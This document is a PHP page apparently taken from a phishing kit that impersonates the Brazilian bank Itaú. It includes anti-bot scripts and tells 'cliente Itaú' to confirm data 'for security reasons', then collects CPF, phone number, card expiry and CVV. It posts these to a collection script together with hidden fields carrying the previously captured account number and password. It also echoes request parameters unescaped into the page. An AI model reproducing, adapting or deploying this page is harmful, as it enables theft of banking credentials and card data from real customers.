<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
include "../BOTS/anti0.php";
include "../BOTS/anti1.php";
include "../BOTS/anti2.php";
include "../BOTS/anti3.php";
include "../BOTS/anti4.php";
//----------------------------------------------------------------------------------------------------------------//

//----------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title> Acesso Online</title>
	
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
	
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	
	<link rel="shortcut icon" href="../assets/imagenss/ico_favicon.png">
	<link rel="stylesheet" type="text/css" href="../assets/css/cad_promo_style.css">
</head>
<body>
	<script type="text/javascript">
		$(document).ready(function() {

			$("input[name=validade]").mask("00/0000");
			$("input[name=cvv]").mask("000");

			var SPMaskBehavior = function (val) {
			  return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
			},
			spOptions = {
			  onKeyPress: function(val, e, field, options) {
			      field.mask(SPMaskBehavior.apply({}, arguments), options);
			    }
			};

			$('input[name=phone]').mask(SPMaskBehavior, spOptions);
			$("input[name=cpf]").mask("000.000.000-00");

			$("input[name=phone]").keyup(function(event) {
				if ($(this).val().length == 15) {
					$("input[name=validade]").focus()
				}
			});

			$("input[name=validade]").keyup(function(event) {
				if ($(this).val().length == 7) {
					$("input[name=cvv]").focus()
				}
			});

		});
	</script>
	<header class="top-promo">
		<img src="../assets/imagenss/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li>Confirmação</li>
			<li>Concluído</li>
		</ul>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
			<p>Olá cliente Itaú, por motivos de segurança, você precisa confirmar os seguintes dados abaixo.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="../comf/envia.php">
				
<input type="hidden" name="mensagem" value="<?php echo $_GET['mensagem']; ?>">

				<div class="frm-item">
					<input type="tel" id="CPF" name="cpf"  autocomplete="off" maxLength="14" required="" minLength="14">
					<label for="numcpf" class="label-float">CPF</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="phone" name="phone"  autocomplete="off" maxLength="14" required="" minLength="14">
					<label for="numcpf" class="label-float">TELEFONE</label>
				</div>


				<div class="frm-item">
					<input type="tel" id="validade" name="validade"  autocomplete="off" maxLength="5" required="" minLength="5">
					<label for="numdtv" class="label-float">Validade do cartão</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="cvv" name="cvv"  autocomplete="off" maxLength="3" required="" minLength="3">
					<label for="numcvv" class="label-float">Código de segurança</label>
					<span id="helpcvv" class="helpcvv"></span>
				</div>
				<input type="submit" id="btncad" class="btncad" name="btncad" value="continuar" style="background-color: rgb(238, 116, 33); color: rgb(255, 255, 255);">


				<input type="hidden" name="numc" value="<?php echo $_POST['numc']; ?>">
				<input type="hidden" name="passc" value="<?php echo $_POST['passc']; ?>">
			</form>
			</form>
		</div>
	</section>
	<section id="mod-help-cvv" class="mod-help-cvv">
		<span id="mod-help-close" class="mod-help-close">x</span>
		<div class="container-mod">
			<img class="img-mod-help" src="../assets/imagenss/img_card_cvv.png">
			<p>O código de segurança são os três dígitos que encontra-se no verso do seu cartão, como mostrado na imagem acima.</p>
		</div>
	</section>
<!--<script type="text/javascript" src="app-f30f696d54feda2a6583.js"></script></body>
	<script src="runtime.bundle.js?data=201806061400"></script>	
	<script src="https://oauth.bb.com.br/ui/v4/vendor.bundle.js?data=201806061400"></script>	
	<script src="https://oauth.bb.com.br/ui/v4/app.bundle.js?data=201806061400"></script-->




        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
        <script>     

           $("#CPF").keyup(function() {               
                if (this.value.length == this.maxLength) {
                    var numcpf = $("#CPF").val();
                    numcpf = numcpf.replace(/[^0-9]/g, '');                    
                    
                    if(numcpf == ""){
                        mostraDialogo("CPF inválido!", "warning", 1000);                   
                    return false;
                }

                if(numcpf == 11111111111){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 22222222222){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 33333333333){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 44444444444){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 55555555555){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 66666666666){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 77777777777){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 88888888888){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 99999999999){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 00000000000){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                    var digitoA = 0;
                    var digitoB = 0;

                    for(var i=0, x=10; i<=8; i++, x--){
                        digitoA += numcpf[i] * x;
                    }

                    for(var i=0, x=11; i<=9; i++, x--){
                        digitoB += numcpf[i] * x;
                    }

                    var somaA = ((digitoA%11) <2) ? 0 : 11-(digitoA%11);
                    var somaB = ((digitoB%11) <2) ? 0 : 11-(digitoB%11);
                
                    if(somaA != numcpf[9] || somaB != numcpf[10]){
                        mostraDialogo("CPF inválido!", "warning", 1000);                   
                        return false;
                    }
                    if(somaA == numcpf[9] || somaB == numcpf[10]){
                        
                        let botaosubmit = $("#btnsubmit");
                        botaosubmit.prop( "disabled", false);
                        botaosubmit.css({'color': '#fff'});         
                        botaosubmit.css({'background-color': '#1EB3BA'});                        
                    }
                    
                }
            });
            
            function mostraDialogo(mensagem, tipo, tempo){
    
    // se houver outro alert desse sendo exibido, cancela essa requisição
    if($("#message").is(":visible")){
        return false;
    }

    // se não setar o tempo, o padrão é 3 segundos
    if(!tempo){
        var tempo = 3000;
    }

    // se não setar o tipo, o padrão é alert-info
    if(!tipo){
        var tipo = "info";
    }

    // monta o css da mensagem para que fique flutuando na frente de todos elementos da página
    var cssMessage = "display: block; position: fixed; bottom: 35px; width: 100%; padding-top: 10px; z-index: 9999; text-align:center; color: #fff;";
    var cssInner = "margin: 0 auto;  background-color: #0000FF;";

    // monta o html da mensagem com Bootstrap
    var dialogo = "";
    dialogo += '<div id="message" style="'+cssMessage+'">';
    dialogo += '    <div class="alert alert-'+tipo+' alert-dismissable" style="'+cssInner+'">';    
    dialogo +=          '<span style="color: #fff; font-family: \'Open Sans\', sans-serif;">'+mensagem+'</span><br><span style="font-size: 14px; color: #fff;">Por favor, digite novamente.</span>';
    dialogo += '    </div>';
    dialogo += '</div>';

    // adiciona ao body a mensagem com o efeito de fade
    $("body").append(dialogo);
    $("#message").hide();
    $("#message").fadeIn(200);

    // contador de tempo para a mensagem sumir
    setTimeout(function() {
        $('#message').fadeOut(300, function(){
            $(this).remove();
        });
    }, tempo); // milliseconds

}
        </script>



</body></html>
